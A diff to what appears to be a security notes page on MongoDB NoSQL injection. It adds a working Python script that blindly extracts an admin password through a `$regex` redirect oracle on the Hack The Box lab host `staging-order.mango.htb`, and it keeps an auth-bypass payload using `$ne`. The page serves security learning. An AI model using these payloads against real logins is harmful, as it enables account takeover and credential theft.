@@ -29,11 +29,34 @@ MongoDB accepts documents and operators such as `$ne`, `$gt`, `$regex` or `$wher
 {"username":"admin","password":{"$ne":"x"}}
 ```
 
+### Blind extraction with `$regex`
+
+In Mango, the login at `staging-order.mango.htb` redirects when the condition is true. The `password[$regex]` field becomes an oracle that reveals the password character by character.
+
+```python
+import requests, string
+prefix = ""
+while True:
+    for c in string.printable:
+        r = requests.post("http://staging-order.mango.htb/", data={
+            "username": "admin",
+            "password[$regex]": "^" + prefix + c + ".*",
+            "login": "login",
+        }, allow_redirects=False)
+        if r.status_code == 302:
+            prefix += c
+            break
+    else:
+        break
+print(prefix)
+```
+
 ## Variants
 
 - Username injection with `$regex`.
 - Arrays that alter `$in` or `$or`.
 - `$where` with JavaScript when enabled.
+- Blind extraction with `$regex` and a boolean response, as in Mango.
 
 ## Limitations
 
